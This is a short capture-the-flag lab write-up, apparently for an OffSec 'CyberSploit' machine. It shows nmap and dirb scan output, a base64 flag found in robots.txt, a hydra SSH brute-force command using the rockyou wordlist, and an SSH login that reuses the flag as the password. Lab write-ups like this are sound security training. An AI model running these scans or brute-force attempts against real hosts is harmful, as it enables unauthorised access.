## Nmap Scan

```
nmap -sV -sC -A 192.168.53.92 --open -p-
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-02 08:15 EDT
Nmap scan report for 192.168.53.92
Host is up (0.0045s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 011bc8fe18712860846a9f303511663d (DSA)
|   2048 d95314a37f9951403f49efef7f8b35de (RSA)
|_  256 ef435bd0c0ebee3e76615c6dce15fe7e (ECDSA)
80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
|_http-title: Hello Pentester!
|_http-server-header: Apache/2.2.22 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.56 seconds

```

## Dirb scan

```
dirb "http://192.168.53.92"

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Wed Aug  2 08:21:14 2023
URL_BASE: http://192.168.53.92/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

                                                                             GENERATED WORDS: 4612

---- Scanning URL: http://192.168.53.92/ ----
                                                                             + http://192.168.53.92/cgi-bin/ (CODE:403|SIZE:289)                         
+ http://192.168.53.92/hacker (CODE:200|SIZE:3757743)                       
+ http://192.168.53.92/index (CODE:200|SIZE:2333)                           
+ http://192.168.53.92/index.html (CODE:200|SIZE:2333)                      
+ http://192.168.53.92/robots (CODE:200|SIZE:53)                            
+ http://192.168.53.92/robots.txt (CODE:200|SIZE:53)                        
+ http://192.168.53.92/server-status (CODE:403|SIZE:294)                    
                                                                               
-----------------
END_TIME: Wed Aug  2 08:21:18 2023
DOWNLOADED: 4612 - FOUND: 7

```

## Finding Lead

- In the home page , we got username in source code 
![image](https://github.com/shyamprasath18/offsec-labs/assets/66670617/c0324ddc-fc4c-410c-ac88-49010954a409)

- In robots.txt found -- `Y3liZXJzcGxvaXR7eW91dHViZS5jb20vYy9jeWJlcnNwbG9pdH0=` -- base64 decoded text -- `cybersploit{youtube.com/c/cybersploit}`

## Hydra scan for SSH 

`hydra -l itsskv -P /usr/share/wordlists/rockyou.txt 192.168.53.92 -t 4 ssh`

- No use taking long time to bruteforce used the username - `itsskv`

## SSH login

- Using the cybersploit as password in SSH .



  
